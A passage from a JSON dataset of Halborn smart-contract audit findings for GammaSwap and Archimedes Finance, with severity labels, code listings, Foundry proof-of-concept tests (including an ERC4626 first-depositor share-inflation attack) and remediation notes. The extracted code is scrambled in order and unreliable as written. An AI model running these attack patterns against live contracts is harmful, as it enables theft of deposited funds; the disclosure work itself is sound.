test_erc4626vulnerability () public { 2 3  address ( weth ) , 20 * 1e6 , 20 * 1 e18 ); 4 5 6 7 8 9 10  weth ) , 10 * 1e6 , 10 * 1 e18 ); 11 12 13 14 15  balance / 2) ; 16 17 18 19 20 21  balance ); 22 23 24 25 26 27 28 29 30 31 32 33 34 vm . roll (16392000 + 2) ; vm . prank ( user1 ); vm . stopPrank () ; } univ2_usdt_weth_pool . deposit (1 , user1 ); vm . startPrank ( deployer ); cfmm_usdt_weth . approve ( address ( univ2_usdt_weth_pool ) , univ2_usdt_weth_pool . deposit ( balance , deployer ); vm . stopPrank () ; univ2_usdt_weth_pool . redeem (1 , user1 , user1 ); uint256 balance_final = cfmm_usdt_weth . balanceOf ( user1 ); console . log ( \" Initial balance : \" , balance ); console . log ( \" Final balance : \" , balance_final ); console . log ( \" Profit : \" , balance_final - balance ); 23 Screenshot: Code Location: Listing 5: GammaPoolERC4626.sol (Line 43) uint256 supply = totalSupply () ; uint256 _totalAssets = totalAssets () ; 39 function convertToShares ( uint256 assets ) public view virtual  returns ( uint256 ) { 40 41 42 43  supply ) / _totalAssets ; 44 } return supply == 0 || _totalAssets == 0 ? assets : ( assets * Risk Level: Likelihood - 3 Impact - 5 Recommendation: The contract should do INITIAL DEPOSIT to any address to prevent this attack to occur. For example, some amounts should be deposited for zero address for the initial deposit. 24 Remediation Plan: SOLVED: The GammaSwap team fixed the vulnerability by making the first Furthermore, there is a minimum amount deposit to the zero address. requirement to prevent rounding issues to occur. Commit IDs:  v1-strategies::5744f386f49d20fabb8760d16088a6f66631e335  v1-core::59dab5059a8214aec4f92fac9feeb11d8eaf9f4f 25 ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: High"
        ]
    },
    {
        "title": "INCORRECT INVARIANT FACTOR CALCULATION MAY LEAD TO A LOSS OF ACCRUED FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The invariant factor formula makes use of the number of decimals of the first token in token pair. The result of this calculation is further used in multiple places across the contracts. For example, when you borrow liquidity from a GammaSwap pool, the protocol calculates that factor to update some storage variables such as lastFeeIndex and BORROWED_INVARIANT . Instead of focusing on s.decimal[0] only, both decimals should be considered. As a result, calculating this variable based on a wrong number of deci- mals affects borrowed/repaid liquidity and many storage variables in the protocol. Proof of Concept: Listing 6: Invariant Factor PoC vm . startPrank ( deployer ); vm . roll (16392000 + 1200) ; _addLiquidityWithUniRouter ( deployer , address ( usdt ) , address ( 1 // replace the s. decimals [0] variable in the getInvariantFactor ()  with 1 e18 and 1 e6 to see difference . 2 function test_BorrowAndRepayLifeCycleTask01 () public { 3 4  weth ) , 10 * 1e6 , 5 * 1 e18 ); 5 6 7 8 9 10 11 12 13 14 usdt . transfer ( user2 , 6 * 1 e6 ); weth . transfer ( user2 , 10 * 1 e18 ); usdt . transfer ( user1 , 5 * 1 e6 ); weth . transfer ( user1 , 2 * 1 e18 ); 26 }) ; vm . stopPrank () ; positionManager . depositNoPull ( depositData ); cfmm_usdt_weth . approve ( address ( positionManager ) , positionManager . transferFrom ( deployer , user1 , loanId ); uint256 loanId = positionManager . createLoan (1 , address ( uint256 loanId2 = positionManager . createLoan (1 , address ( IPositionManager . DepositWithdrawParams memory depositData = protocolId : 1 , cfmm : address ( cfmm_usdt_weth ) , to : user1 , lpTokens : cfmm_usdt_weth . balanceOf ( deployer ) , deadline : 99999 15  cfmm_usdt_weth ) , deployer , type ( uint ). max ); 16  cfmm_usdt_weth ) , user2 , type ( uint ). max ); 17 18 19  IPositionManager . DepositWithdrawParams ({ 20 21 22 23 24 25 26 27  cfmm_usdt_weth . balanceOf ( deployer )) ; 28 29 30 31 32 33  , 1 e6 , 1 e18 ); 34 35 36 37 38 39 40 41  increaseCollData = IPositionManager . AddRemoveCollateralParams ({ 42 43 44 45 46 47 48 49 50 51 52 protocolId : 1 , cfmm : address ( cfmm_usdt_weth ) , to : user1 , tokenId : loanId , deadline : 99999 , amounts : amountsDesired uint256 [] memory amountsDesired = new uint256 [](2) ; amountsDesired [0] = 1 e18 ; amountsDesired [1] = 1 e6 ; usdt . approve ( address ( positionManager ) , amountsDesired [1]) ; weth . approve ( address ( positionManager ) , amountsDesired [0]) ; IPositionManager . AddRemoveCollateralParams memory vm . startPrank ( user1 ); }) ; _addLiquidityWithUniRouter ( user1 , address ( usdt ) , address ( weth ) 27 usdt . approve ( address ( positionManager ) , amountsDesired [1]) ; weth . approve ( address ( positionManager ) , amountsDesired [0]) ; vm . roll (16392000 + 1304) ; positionManager . increaseCollateral ( increaseCollData ); vm . roll (16392000 + 1252) ; positionManager . increaseCollateral ( increaseCollData ); increaseCollData . amounts = amountsDesired ; vm . stopPrank () ; vm . stopPrank () ; vm . startPrank ( user2 ); amountsDesired [0] = 1 e18 ; amountsDesired [1] = 1 e6 ; increaseCollData . tokenId = loanId2 ; increaseCollData . to = user2 ; 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78  IPositionManager . BorrowLiquidityParams ({ 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 protocolId : 1 , cfmm : address ( cfmm_usdt_weth ) , to : user1 , tokenId : loanId , lpTokens : uint256 (1 e12 ) * 800 / 1000 , deadline : 99999 , minBorrowed : new uint256 [](2) amountsDesired [0] = 1 e18 ; amountsDesired [1] = 1 e6 ; vm . roll (16392000 + 1340) ; vm . startPrank ( user1 ); }) ; increaseCollData . amounts = amountsDesired ; positionManager . borrowLiquidity ( borrowLqtyData ); IPositionManager . BorrowLiquidityParams memory borrowLqtyData = 28 96 97 98 99 100 101 102 vm . stopPrank () ; vm . prank ( user2 ); positionManager . decreaseCollateral ( increaseCollData ); IPositionManager . RepayLiquidityParams memory repayData =  IPositionManager . RepayLiquidityParams ({ 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 } protocolId : 1 , cfmm : address ( cfmm_usdt_weth ) , to : user1 , tokenId : loanId , liquidity : 1000000 / 2, deadline : 99999 , minRepaid : new uint256 [](2) }) ; vm . stopPrank () ; vm . startPrank ( deployer ); usdt . transfer ( address ( cfmm_usdt_weth ) , 10 * 1 e6 ); weth . transfer ( address ( cfmm_usdt_weth ) , 5 * 1 e18 ); vm . stopPrank () ; Screenshot: 29 Code Location: BaseStrategy Listing 7: BaseStrategy.sol (Line 33) 32 function getInvariantFactor () internal virtual override view  returns ( uint256 ) { 33 34 } return 10 ** s . decimals [0]; AbstractRateModel Listing 8: AbstractRateModel.sol (Line 11) uint256 totalInvariant = lpInvariant + borrowedInvariant ; if ( totalInvariant == 0) 6 function calcUtilizationRate ( uint256 lpInvariant , uint256  borrowedInvariant ) internal virtual view returns ( uint256 ) { 7 8 9 10 11  totalInvariant ; 12 } return borrowedInvariant * getInvariantFactor () / return 0; Risk Level: Likelihood - 3 Impact - 4 Recommendation: Consider changing the invariant factor formula to include the number of decimals of both tokens in a pair. If the invariant factor is less than 1e18, loss of precision may occur. 30 Remediation Plan: SOLVED: This finding was identified in a code walkthrough jointly by the GammaSwap team and the Halborn team, and the existence of the finding was confirmed by the Halborn team. The invariant factor is now calculated as 10**18. Commit ID: v1-strategies::85864193924b7d1299dd99a27ded752c807ae2cb 31 ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: Medium"
        ]
    },
    {
        "title": "CALLING THE BATCHLIQUIDATIONS FUNCTION WITH TOKENID 0 ALWAYS REVERTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The _batchLiquidations function implemented in the LiquidationStrategy contract is designed to perform more than one liquidation in a go. The tokenId > 0 check on the payLoanAndRefundLiquidator function assures that users can use 0 as tokenId for batch liquidation operation. However, it is not possible to use 0 as tokenId in the _batchLiquidations function. The _batchLiquidations function makes an internal call to the sumLiquidity function. During the calculation of the liquidity variable, the execution is reverted with the Division or modulo by 0 error since the _loan. rateIndex is also zero for tokenId 0. Code Location: Listing 9: LiquidationStrategy.sol (Line 164) 156 function sumLiquidity ( uint256 [] calldata tokenIds ) internal  virtual returns ( uint256 liquidityTotal , uint256 collateralTotal ,  uint256 lpTokensPrincipalTotal , uint128 [] memory tokensHeldTotal )  { 157 158 159 160 161 162 163 164 address [] memory tokens = s . tokens ; uint128 [] memory tokensHeld ; address cfmm = s . cfmm ; tokensHeldTotal = new uint128 []( tokens . length ); ( uint256 accFeeIndex , ,) = updateIndex () ; for ( uint256 i = 0; i < tokenIds . length ; i ++) { LibStorage . Loan storage _loan = s. loans [ tokenIds [ i ]]; uint256 liquidity = uint128 (( _loan . liquidity * accFeeIndex  ) / _loan . rateIndex ); 165 166 tokensHeld = _loan . tokensHeld ; lpTokensPrincipalTotal = lpTokensPrincipalTotal + _loan .  lpTokens ; 167 _loan . liquidity = 0; 32 168 169 170 171 172 173 174 175 176 _loan . initLiquidity = 0; _loan . rateIndex = 0; _loan . lpTokens = 0; uint256 collateral = calcInvariant ( cfmm , tokensHeld ); canLiquidate ( collateral , liquidity , 950) ; collateralTotal = collateralTotal + collateral ; liquidityTotal = liquidityTotal + liquidity ; for ( uint256 j = 0; j < tokens . length ; j ++) { tokensHeldTotal [ j ] = tokensHeldTotal [ j] + tokensHeld [ j _loan . tokensHeld [ j] = 0;  ]; 177 178 179 180 } } } Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to add a sanity check to prevent division by zero in the sumLiquidity function. The contract should not continue dividing if denominator of division operations are zero. Remediation Plan: NOT APPLICABLE: The GammaSwap team confirmed that throwing the Division or modulo by zero error is the intended behavior. 33 ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: Medium"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH FEE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When depositing reserves, it was identified that the preDepositToCFMM() function assumes that the deposited amount of tokens is the same as sent in the parameter plus the balance before the deposit. This could block any deposit if a deflationary token is used, as the calculated amount could be lower than the deposited amount. The comparison with the not equal (!=) sign does not work with any of Fee-On-Transfer tokens. Code Location: ShortStrategy Listing 10: ShortStrategy.sol (Line 61) balances [i ] = GammaSwapLibrary . balanceOf ( IERC20 ( tokens function preDepositToCFMM ( uint256 [] memory amounts , address to address [] storage tokens = s. tokens ; uint256 [] memory balances = new uint256 []( tokens . length ); for ( uint256 i = 0; i < tokens . length ; i ++) { 52  , bytes memory data ) internal virtual { 53 54 55 56  [ i ]) , to ); 57 58  amounts , to , data ); // TODO : Risky . Should set sender to PosMgr 59 for ( uint256 i = 0; i < tokens . length ; i ++) { 60 61  balanceOf ( IERC20 ( tokens [i ]) , to )) { 62 63 64 } ISendTokensCallback ( msg . sender ). sendTokensCallback ( tokens , if ( balances [ i ] + amounts [i ] != GammaSwapLibrary . revert WrongTokenBalance ( tokens [i ]) ; if ( amounts [ i] > 0) { } } 34 Risk Level: Likelihood - 3 Impact - 3 Recommendation: The last if statement of preDepositToCFMM() function should be replaced to include preBalance and postBalance variables and verification of the balance before/after the transfer. Remediation Plan: NOT APPLICABLE: The GammaSwap team confirmed this if block is added intentionally. The GammaSwap team added some features to contracts to prevent potential problems with fee-on-transfer tokens. Commit IDs:  v1-core::59dab5059a8214aec4f92fac9feeb11d8eaf9f4f  v1-periphery::43eab8008f052671b9f091b0834b7dcc0d15c9fc 35 ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: Medium"
        ]
    },
    {
        "title": "CENTRALIZATION RISK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The extra condition in the if statement described in the Code Location section poses a centralization risk. The isRestricted function is de- signed to check if a protocolId is restricted. However, the _owner of the contract is excluded from this control. This increases the centralization of the contract. Code Location: GammaPoolFactory Listing 11: GammaPoolFactory.sol (Line 26) if ( isProtocolRestricted [ protocolId ] == true && msg . sender != 25 function isRestricted ( uint16 protocolId , address _owner ) internal  virtual view { 26  _owner ) { 27 28 29 } revert ProtocolRestricted () ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider removing _owner != msg.sender control from the if block or de- centralizing protocol governance. 36 Remediation Plan: RISK ACCEPTED: The GammaSwap team accepted the risk, and they confirmed a multisig wallet will be the owner of the contract. 37 ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: Low"
        ]
    },
    {
        "title": "LOAN CALCULATION CAN BE MISLEADING FOR DIFFERENT CHAINS DUE TO HARDCODED VARIABLES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The calcFeeIndex function in the BaseStrategy contract uses one year as a constant, with its value equal to the number of blocks per year (2252571). This assumes a block is mined every 14 seconds on average. However, average block time may vary across EVM-compatible chains. In this case, the results can be misleading or inaccurate for those other chains. Code Location: BaseStrategy Listing 12: BaseStrategy.sol (Lines 47,49) uint256 blockDiff = block . number - lastBlockNum ; uint256 adjBorrowRate = ( blockDiff * borrowRate ) / 2252571; // 45 function calcFeeIndex ( uint256 lastCFMMFeeIndex , uint256 borrowRate  , uint256 lastBlockNum ) internal virtual view returns ( uint256 ) { 46 47  2252571 year block count 48 49 50 51 } uint256 ONE = 10**18; uint256 apy1k = ONE + ( blockDiff * 10 * ONE ) / 2252571; return Math . min ( apy1k , lastCFMMFeeIndex + adjBorrowRate ); Risk Level: Likelihood - 2 Impact - 3 38 Recommendation: Instead of hardcoding the number of blocks per year, consider adding a constructor argument to be able to deploy the protocol into other chains than Ethereum network. Remediation Plan: SOLVED: The GammaSwap team replaced the hardcoded variable with a con- structor parameter. With this update, it is possible to change the number of blocks per year. Commit ID: v1-strategies::1d2c35c5324209bb74133338bee991be4b4378b7 39 ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: Low"
        ]
    },
    {
        "title": "TOKEN SWAPPING CAN FAIL DUE TO DIVISION BY ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There is an edge case scenario of token swapping operation which leads to the division by zero error. The beforeSwapTokens function in the CPMMBaseLongStrategy contract is a function which calculates the exact in and out amounts of the swap operation. If amountIn and reserveIn parameters of calcAmtOut() function are equal, then the denominator is equal to zero. As a result, the swapping operation fails in this case. Code Location: Listing 13: CPMMBaseLongStrategy.sol (Line 109) 105 function calcAmtOut ( uint256 amountIn , uint256 reserveOut , uint256  reserveIn ) internal view returns ( uint256 ) { if ( reserveOut == 0 || reserveIn == 0) { revert ZeroReserves () ; } uint256 denominator = ( reserveIn - amountIn ) * tradingFee1 ; return ( reserveOut * amountIn * tradingFee2 / denominator ) + 106 107 108 109 110  1; 111 } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Consider implementing an additional condition to prevent the denominator from being equal to zero. 40 Remediation Plan: NOT APPLICABLE: The GammaSwap team confirmed the delta of reserveIn and amountIn will not be equal to 0 for Uniswap swaps. Therefore, reaching the Division by zero revert is impossible in this edge case. 41 ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ZERO AMOUNT CHECK MAY LEAD DIVISION BY ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GammaSwap_Labs_Core_Strategies_and_Periphery_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In Solidity, transactions are reverted with the division by zero error message when a division by zero is attempted. In the BaseStrategy.sol contract, some possible divisions by 0 can be performed when calling calcCFMMFeeIndex() function. This division operation should be preceded by sanity checks to prevent dividing a number by zero. Code Location: Listing 14: BaseStrategy.sol (Line 39) uint256 prevInvariant = borrowedInvariant > if ( lastCFMMInvariant > 0 && lastCFMMTotalSupply > 0 && 36 function calcCFMMFeeIndex ( uint256 borrowedInvariant , uint256  lastCFMMInvariant , uint256 lastCFMMTotalSupply , uint256  prevCFMMInvariant , uint256 prevCFMMTotalSupply ) internal virtual  view returns ( uint256 ) { 37  prevCFMMInvariant > 0 && prevCFMMTotalSupply > 0) { 38  prevCFMMInvariant ? borrowedInvariant : prevCFMMInvariant ; //  deleverage CFMM Yield 39  lastCFMMTotalSupply ) / 10**18; 40  lastCFMMTotalSupply * ( prevInvariant - prevCFMMInvariant )) /  denominator ); 41 42 43 return (( lastCFMMInvariant * prevCFMMTotalSupply + uint256 denominator = ( prevInvariant * } return 10**18; } 42 Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to add a sanity check to control whether the borrowed amount is zero or not. Remediation Plan: SOLVED: This finding was resolved by the GammaSwap team after changing the calculation to remove the possibility of dividing by 0. v1-strategies::d5f3cedf864d7def66ea9e2ea72273704d1e4992 43 3.10 (HAL-10) MISSING ZERO ADDRESS CHECKS - LOW ",
        "labels": [
            "Halborn",
            "GammaSwap_Labs_Core_Strategies_and_Periphery",
            "Severity: Informational"
        ]
    },
    {
        "title": "HAL01",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It has been observed that once a user tries to create any position, the Leverage Engine will try to transfer the OUSD principle to the Leverage Engine. However, due to OUSD behavior, trying to transfer more tokens than allowance will revert with an Underflow error message. Although in recent versions of solidity, this is no longer a critical issue as the value doesnt reset to the maximum value, it is still recommended to verify that the user has enough allowance before transferring the tokens, as the underflow error can be confusing to users. Code Location: Listing 1: contracts/LeverageEngine.sol (Line 99) 62 /* Non - privileged functions */ 63 64 // / @dev deposit OUSD under NFT ID 65 // / 66 // / User sends OUSD to the contract . 67 // / We mint NFT , assign to msg . sender and do the leverage cycles 68 // / 69 // / @param ousdPrinciple the amount of OUSD sent to Archimedes 70 // / @param cycles How many leverage cycles to do 71 // / @param maxArchAmount max amount of Arch tokens to burn for  position 72 function createLeveragedPosition ( uint256 ousdPrinciple , 73 uint256 cycles , 74 uint256 maxArchAmount 75 76 ) external nonReentrant whenNotPaused returns ( uint256 ) { 77  position 78  getMaxNumberOfCycles () ) { // add some minor buffer to the arch we will use for the if ( cycles == 0 || cycles > _parameterStore . 14 revert ( \" Invalid number of cycles \"); revert ( \" Collateral lower then min \" ); uint256 lvUSDAmountNeedForArguments = _parameterStore . // / check that user gave enough arch allowance for cycle - } // console . log (\" ousdPrinciple % s\", ousdPrinciple ) ; if ( ousdPrinciple < _parameterStore . getMinPositionCollateral () } // console . log (\" maxArchAmountBufferedDown %s \", maxArchAmount ) ; uint256 maxArchAmountBufferedDown = maxArchAmount ; uint256 lvUSDAmount = _parameterStore . 79 80 81 82  ) { 83 84 85 86 87  getAllowedLeverageForPositionWithArch ( ousdPrinciple , cycles ,  maxArchAmountBufferedDown ); 88  getAllowedLeverageForPosition ( ousdPrinciple , cycles ); 89  principle combo 90  get enough lvUSD \" ); 91  calculateArchNeededForLeverage ( lvUSDAmount ) / 10000) * 10000; //  minus 1000 wei 92 93 94  enough Arch given for Pos \" ); 95 96  lvUSD \" ); 97 98 99  ousdPrinciple ); _burnArchTokenForPosition ( msg . sender , archNeededToBurn ); uint256 positionTokenId = _positionToken . safeMint ( msg . sender ); _ousd . safeTransferFrom ( msg . sender , _addressCoordinator , uint256 availableLev = _coordinator . getAvailableLeverage () ; require ( availableLev >= lvUSDAmount , \" Not enough available require ( lvUSDAmountNeedForArguments - 1 <= lvUSDAmount , \" cant require ( archNeededToBurn <= maxArchAmountBufferedDown , \" Not // console . log (\" archNeededToBurn %s \", maxArchAmount ) ; uint256 archNeededToBurn = ( _parameterStore . 100 _coordinator . depositCollateralUnderNFT ( positionTokenId ,  ousdPrinciple ); 101 102 _coordinator . getLeveragedOUSD ( positionTokenId , lvUSDAmount ); uint256 psoitionExpireTime = _coordinator .  getPositionExpireTime ( positionTokenId ); 103 104 emit PositionCreated ( msg . sender , positionTokenId ,  ousdPrinciple , lvUSDAmount , archNeededToBurn , psoitionExpireTime ); 105 106 107 } return positionTokenId ; 15 Proof Of Concept:  The user calls the createLeveragedPosition() in the LeverageEngine contract having enough OUSD balance but not enough allowance.  Transaction revert due to integer underflow. Risk Level: Likelihood - 4 Impact - 2 Recommendation: Implementing a require statement validating that the users allowance for the Leverage Engine is equal to or greater than the OUSD principle is recommended. Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue by checking that the OUSD allowance is equal to or greater than the OUSD principle provided in the arguments. 16 ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF DISABLEINITIALIZERS CALL TO PREVENT UNINITIALIZED CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multiple contracts are using the Initializable module from OpenZeppelin. To prevent leaving an implementation contract uninitialized OpenZep- pelins documentation recommends adding the _disableInitializers func- tion in the constructor to lock the contracts automatically when they are deployed: Code Location: Listing 2 * @dev Locks the contract , preventing any future reinitialization * Calling this in the constructor of a contract will prevent that * to any version . It is recommended to use this to lock * through proxies . */ 1 /* * 2  . This cannot be part of an initializer call . 3  contract from being initialized or reinitialized 4  implementation contracts that are designed to be called 5 6 7 function _disableInitializers () internal virtual { 8  initializing \"); 9 10 11 12 13 } _initialized = type ( uint8 ). max ; emit Initialized ( type ( uint8 ). max ); require (! _initializing , \" Initializable : contract is if ( _initialized < type ( uint8 ). max ) { } 17 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Consider function TimeLockControllerUpgradeable contract constructor as well: _disableInitializers calling the in the Listing 3 1 // / @custom : oz - upgrades - unsafe - allow constructor 2 constructor () { 3 4 } _disableInitializers () ; Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue by calling the _disableInitializers function in the contract constructor. 18 ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF PARAMETER PRECISION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It has been detected that some parameters used in the different contracts are set and used in a way that lets the minimum settable value at 1%. Code Location: Listing 4: ParameterStore.sol (Line 40) _maxNumberOfCycles = 10; _originationFeeRate = 5 ether / 100; _globalCollateralRate = 90; _rebaseFeeRate = 10 ether / 100; // meaning 10% _treasuryAddress ; _curveGuardPercentage = 90; _slippage = 2; // 2%; _archToLevRatio = 1 ether ; // meaning 1 arch is equal 1 34 35 36 37 38 39 40 41  lvUSD 42  with get 50% more then we expected 43 _treasuryAddress = address (0) ; _curveMaxExchangeGuard = 50; // meaning we allow exchange For example, _slippage is set to 2, implying that a maximum slippage of 2% is allowed. However, if this value needs to be modified in the future or if user-controlled slippage is implemented, it would only accept integer values, such as 0%, 1%, 2%, etc. Risk Level: Likelihood - 1 Impact - 3 19 Recommendation: Consider increasing the digits in the % calculations to allow more flex- ibility when using these parameters. Remediation Plan: NOT SOLVED: The Archimedes Finance team did not solve the issue. 20 ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "INCONSISTENT PARAMETER FORMATTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "ParameterStore.sol contract stores global parameters used when managing positions, such as _maxNumberOfCycles, _originationFeeRate, etc. However, it has been detected that parameters with a similar format or that are used in similar ways (like percentages, for example) are defined and used differently, which could cause unexpected contract behavior (or even worse situations such as fund loss) if they are mistakenly modified. Code Location: Listing 5: ParameterStore.sol (Lines 36,37) _maxNumberOfCycles = 10; _originationFeeRate = 5 ether / 100; _globalCollateralRate = 90; _rebaseFeeRate = 10 ether / 100; // meaning 10% _treasuryAddress ; _curveGuardPercentage = 90; _slippage = 2; // 2%; _archToLevRatio = 1 ether ; // meaning 1 arch is equal 1 34 35 36 37 38 39 40 41  lvUSD 42  with get 50% more then we expected 43 _treasuryAddress = address (0) ; _curveMaxExchangeGuard = 50; // meaning we allow exchange In this example can be seen how two different rates (with 90% and 10% values, respectively) are calculated differently. Risk Level: Likelihood - 1 Impact - 3 21 Recommendation: It is strongly recommended to unify the parameter criteria in a way that allows contract administrators to set parameters of the same nature in the same way. Remediation Plan: RISK ACCEPTED: The Archimedes Finance team accepted the risk of this finding. 22 ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF 0 ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When setting the dependencies for the contract through the setDependencies () functions, the 0 address is not being checked in any of the contracts. Code Location: Listing 6: contracts/LeverageEngine.sol address addressCoordinator , address addressPositionToken , address addressParameterStore , address addressArchToken , address addressOUSD 43 function setDependencies ( 44 45 46 47 48 49 ) external nonReentrant onlyAdmin { 50 51 52 53 54 55 56 57 58 59 60 } 61 _addressCoordinator = addressCoordinator ; _coordinator = ICoordinator ( addressCoordinator ); _addressPositionToken = addressPositionToken ; _positionToken = PositionToken ( addressPositionToken ); _addressParameterStore = addressParameterStore ; _parameterStore = ParameterStore ( addressParameterStore ); _addressArchToken = addressArchToken ; _archToken = ArchToken ( addressArchToken ); _addressOUSD = addressOUSD ; _ousd = IERC20Upgradeable ( _addressOUSD ); Risk Level: Likelihood - 2 Impact - 1 23 Recommendation: When setting an address variable, always make sure the value is not zero. Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue by adding a zero address check in the setDependencies() functions. 24 ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "> 0 IS LESS EFFICIENT THAN != 0 FOR UINTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The use of > consumes more gas than !=. There are some cases where both can be used indistinctly, such as in unsigned integers where numbers cant be negative, and as such, there is only a need to check that a number is not 0. Code Location: CDPosition.sol - Line 40: require(_nftCDP[nftID].oUSDPrinciple > 0, \"NFT ID must exist \"); Coordinator.sol Line - shares\"); 143: require(numberOfSharesInPosition > 0, \"Position has no ParameterStore.sol - Line 63: require(newMaxNumberOfCycles < 20 && newMaxNumberOfCycles > 0, \"New max n of cycles out of range\"); - Line 81: require(newGlobalCollateralRate <= 100 && newGlobalCollateralRate > 0, \"New collateral rate out of range\"); - Line 87: require(newMaxNumberOfCycles < 20 && newMaxNumberOfCycles > 0, \"New max n of cycles out of range\"); Risk Level: Likelihood - 1 Impact - 1 25 Recommendation: Use != instead of > in cases where both can be used. Remediation Plan: SOLVED: The Archimedes Finance team fixed the issue by replacing > with !=. 26 ",
        "labels": [
            "Halborn",
            "Archimedes_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT VARIABLE USAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Archimedes_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Redundant variable assignments have been found through the code. These statements increase gas costs for contract deploying and interactions, and impact code readability. Code Location: In this example, maxArchAmountBufferedDown is assigned with the value from the maxArchAmount parameter instead of using the parameter variable directly. Listing 7: contracts/LeverageEngine.sol (Line 72) // add some minor buffer to the arch we will use for the if ( cycles == 0 || cycles > _parameterStore . 72 function createLeveragedPosition ( uint256 ousdPrinciple , 73 uint256 cycles , 74 uint256 maxArchAmount 75 76 ) external nonReentrant whenNotPaused returns ( uint256 ) { 77  position 78  getMaxNumberOfCycles () ) { 79 80 81 82  ) { 83 84 85 86 revert ( \" Collateral lower then min \" ); revert ( \" Invalid number of cycles \"); } // console . log (\" ousdPrinciple % s\", ousdPrinciple ) ; if ( ousdPrinciple < _parameterStore . getMinPositionCollateral () } // console . log (\" maxArchAmountBufferedDown %s \", maxArchAmount ) ; uint256 maxArchAmountBufferedDown = maxArchAmount ; Moreover, in this other example cyclePrinciple is assigned with the value from the principle parameter. 27 Listing 8: contracts/ParameterStore.sol (Line 171) 171 function getAllowedLeverageForPosition ( uint256 principle , uint256  numberOfCycles ) public view returns ( uint256 ) { 172 require ( numberOfCycles <= _maxNumberOfCycles , \" Cycles greater  than max allowed \" ); 173 174 uint256 leverageAmount = 0; uint256 cyclePrinciple = principle ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Redundant variable assignments should be deleted to improve code read- ability and usability and reduce gas costs when deploying or interacting with the contract. Remediation Plan: PARTIALLY SOLVED: The Archimedes Finance team fixed the issue in some instances, but 